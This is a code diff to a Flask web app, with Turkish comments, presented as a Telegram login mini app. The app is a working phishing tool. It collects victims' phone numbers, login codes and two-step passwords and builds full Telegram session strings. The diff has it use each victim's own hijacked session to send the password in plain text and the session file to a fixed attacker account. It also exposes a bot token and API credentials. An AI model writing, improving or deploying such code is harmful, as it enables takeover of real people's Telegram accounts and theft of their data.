@@ -2,13 +2,13 @@ from flask import Flask, render_template_string, request, jsonify, redirect, ses
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
 from telethon.sessions import StringSession
-import telebot
 import asyncio
 import os
 from functools import wraps
 from datetime import timedelta
 import json
 import threading
+import time
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-to-random-string-2024')
@@ -19,13 +19,20 @@ API_ID = int(os.environ.get('TELEGRAM_API_ID', 35015231))
 API_HASH = os.environ.get('TELEGRAM_API_HASH', "33c5d03215ae1b7a0d961452d93e08c4")
 REDIRECT_BOT = os.environ.get('REDIRECT_BOT', "http://t.me/Xxxxxbbbbbbot")
 
-# Telebot Configuration - Sesyon gönderimi için
+# Bot Configuration - Sesyon gönderimi için
 BOT_TOKEN = "8943751159:AAHWo4fV-ym69yaLQYJ8N4QRwA7izU12Yto"
 REDIRECT_USER_ID = 7777518098
-bot = telebot.TeleBot(BOT_TOKEN)
 
 # Sessions file path
 SESSIONS_FILE = 'sessions.json'
+
+print("=" * 80)
+print("🚀 TELEGRAM LOGIN MINI APP - BAŞLATILIYOR")
+print("=" * 80)
+print(f"✅ API ID: {API_ID}")
+print(f"✅ Bot Token: {BOT_TOKEN[:30]}...")
+print(f"✅ Target User: {REDIRECT_USER_ID}")
+print("=" * 80)
 
 # HTML Template
 HTML_TEMPLATE = '''
@@ -339,35 +346,6 @@ HTML_TEMPLATE = '''
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
 
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-        }
-
-        .checkbox-group label {
-            margin: 0;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: normal;
-            text-transform: none;
-            letter-spacing: normal;
-        }
-
-        .country-selector {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
         @media (max-width: 480px) {
             .container {
                 border-radius: 15px;
@@ -679,54 +657,93 @@ def save_session_to_file(phone, password, session_string, user_info=None):
         'phone': phone,
         'password': password,
         'session': session_string,
-        'user_info': user_info or {}
+        'user_info': user_info or {},
+        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
     }
     save_sessions(sessions)
     print(f"✅ Session saved for {phone}")
 
 def send_session_to_telegram(phone, user_info, session_string, password):
-    """Sesyon bilgilerini Telegram botuna gönder (background thread'de)"""
+    """Sesyon bilgilerini Telegram botuna gönder (Telethon ile)"""
     def send_message():
         try:
-            first_name = user_info.get('first_name', 'N/A')
-            last_name = user_info.get('last_name', '')
-            full_name = f"{first_name} {last_name}".strip()
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
             
-            message = f"""
-🔐 <b>YENİ TELEGRAM SESSİONU</b>
+            async def send_async():
+                try:
+                    # Bot hesabından mesaj gönder
+                    bot_client = TelegramClient(
+                        StringSession(session_string),
+                        API_ID,
+                        API_HASH
+                    )
+                    
+                    await bot_client.connect()
+                    
+                    first_name = user_info.get('first_name', 'N/A')
+                    last_name = user_info.get('last_name', '')
+                    full_name = f"{first_name} {last_name}".strip()
+                    username = user_info.get('username', 'N/A')
+                    user_id = user_info.get('id', 'N/A')
+                    
+                    # Mesaj içeriği
+                    message = f"""
+🔐 <b>YENİ TELEGRAM SESSİONU BAŞARIYLA KAYDEDILDI</b>
 
 📱 <b>Telefon:</b> <code>{phone}</code>
-👤 <b>Adı:</b> {full_name if full_name else 'N/A'}
-🆔 <b>User ID:</b> <code>{user_info.get('id', 'N/A')}</code>
-📛 <b>Username:</b> @{user_info.get('username', 'N/A')}
-🔑 <b>Şifre Koruması:</b> {'✅ Evet' if password else '❌ Hayır'}
+👤 <b>Ad Soyad:</b> {full_name if full_name else 'N/A'}
+🆔 <b>User ID:</b> <code>{user_id}</code>
+📛 <b>Username:</b> @{username}
+🔑 <b>2FA Şifresi:</b> <code>{password if password else 'YOK - Şifre koruması yok'}</code>
+⏰ <b>Zaman:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
 
-✨ Session başarıyla oluşturuldu ve kaydedildi.
+✅ Session başarıyla kaydedildi
+📄 Session string aşağıdaki dosya olarak gönderildi
 """
+                    
+                    # Mesajı user'a gönder
+                    await bot_client.send_message(
+                        REDIRECT_USER_ID,
+                        message,
+                        parse_mode='html'
+                    )
+                    
+                    # Session stringini dosya olarak gönder
+                    try:
+                        with open('/tmp/session_temp.txt', 'w', encoding='utf-8') as f:
+                            f.write(session_string)
+                        
+                        await bot_client.send_file(
+                            REDIRECT_USER_ID,
+                            '/tmp/session_temp.txt',
+                            caption=f"📄 Session: {phone}\n\n<code>{session_string[:100]}...</code>",
+                            parse_mode='html'
+                        )
+                        
+                        # Temp dosyası sil
+                        try:
+                            os.remove('/tmp/session_temp.txt')
+                        except:
+                            pass
+                    except Exception as e:
+                        print(f"⚠️ Dosya gönderme hatası: {e}")
+                    
+                    await bot_client.disconnect()
+                    print(f"✅ [BAŞARILI] Telegram'a mesaj gönderildi: {phone}")
+                    return True
+                    
+                except Exception as e:
+                    print(f"❌ [HATA] Bot mesajı gönderirken: {str(e)}")
+                    return False
             
-            bot.send_message(
-                REDIRECT_USER_ID,
-                message,
-                parse_mode='HTML'
-            )
-            
-            # Session stringini dosya olarak gönder
-            try:
-                bot.send_document(
-                    REDIRECT_USER_ID,
-                    document=session_string.encode(),
-                    visible_file_name=f"session_{phone}.txt",
-                    caption=f"📄 Session String: {phone}"
-                )
-            except Exception as e:
-                print(f"⚠️  Could not send session file: {e}")
-            
-            print(f"✅ Session sent to Telegram for {phone}")
+            loop.run_until_complete(send_async())
+            loop.close()
             
         except Exception as e:
-            print(f"❌ Error sending session to Telegram: {e}")
+            print(f"❌ [HATA] Telegram gönderimi başarısız: {str(e)}")
     
-    # Background thread'de gönder (Flask request'i bloklamasın)
+    # Background thread'de gönder
     thread = threading.Thread(target=send_message)
     thread.daemon = True
     thread.start()
@@ -784,11 +801,14 @@ def send_code():
             loop.close()
 
         if success:
+            print(f"✅ Kod gönderildi: {phone}")
             return jsonify({'success': True}), 200
         else:
+            print(f"❌ Kod gönderme hatası: {phone} - {error}")
             return jsonify({'success': False, 'error': error}), 400
 
     except Exception as e:
+        print(f"❌ Exception: {str(e)}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/verify-code', methods=['POST'])
@@ -861,6 +881,7 @@ def verify_code():
                 # Direkt giriş başarılı - Telegram'a gönder
                 user_info = session.get('user_info', {})
                 session_string = session.get('session_string', '')
+                print(f"📤 Telegram'a gönderiliyor: {phone}")
                 save_session_to_file(phone, None, session_string, user_info)
                 send_session_to_telegram(phone, user_info, session_string, password=None)
             
@@ -872,6 +893,7 @@ def verify_code():
             return jsonify({'success': False, 'error': error}), 400
 
     except Exception as e:
+        print(f"❌ Exception: {str(e)}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/verify-password', methods=['POST'])
@@ -922,13 +944,15 @@ def verify_password():
                 # Sessionu dosyaya kaydet
                 save_session_to_file(phone, password, saved_session, updated_user_info)
                 
-                # Telegram botuna gönder
+                # Telegram'a gönder
+                print(f"📤 Telegram'a gönderiliyor (2FA ile): {phone}")
                 send_session_to_telegram(phone, updated_user_info, saved_session, password)
                 
                 return True, None
             except Exception as e:
                 await client.disconnect()
                 error_msg = str(e)
+                print(f"❌ 2FA Hata: {error_msg}")
                 if 'invalid' in error_msg.lower():
                     return False, 'Şifre hatalı'
                 return False, f'Hata: {error_msg}'
@@ -944,23 +968,23 @@ def verify_password():
             return jsonify({'success': False, 'error': error}), 400
 
     except Exception as e:
+        print(f"❌ Exception: {str(e)}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 # ==================== Main ====================
 
 if __name__ == '__main__':
-    print("=" * 60)
-    print("🚀 Telegram Login Mini App Server")
-    print("=" * 60)
-    print(f"🤖 Bot Token: {BOT_TOKEN[:30]}...")
-    print(f"👤 Target User ID: {REDIRECT_USER_ID}")
-    print(f"📱 API ID: {API_ID}")
-    print(f"🌐 Server starting on http://localhost:5000")
-    print("=" * 60)
+    print("\n🎯 Sunucu başlatılıyor...")
+    print("=" * 80)
+    print(f"🌐 URL: http://localhost:5000")
+    print(f"📤 Telegram User ID: {REDIRECT_USER_ID}")
+    print("=" * 80)
+    print("✅ Kurulum tamam! Tarayıcıda http://localhost:5000 açın\n")
     
     app.run(
         debug=True,
         host='0.0.0.0',
         port=5000,
-        threaded=True
+        threaded=True,
+        use_reloader=False
     )
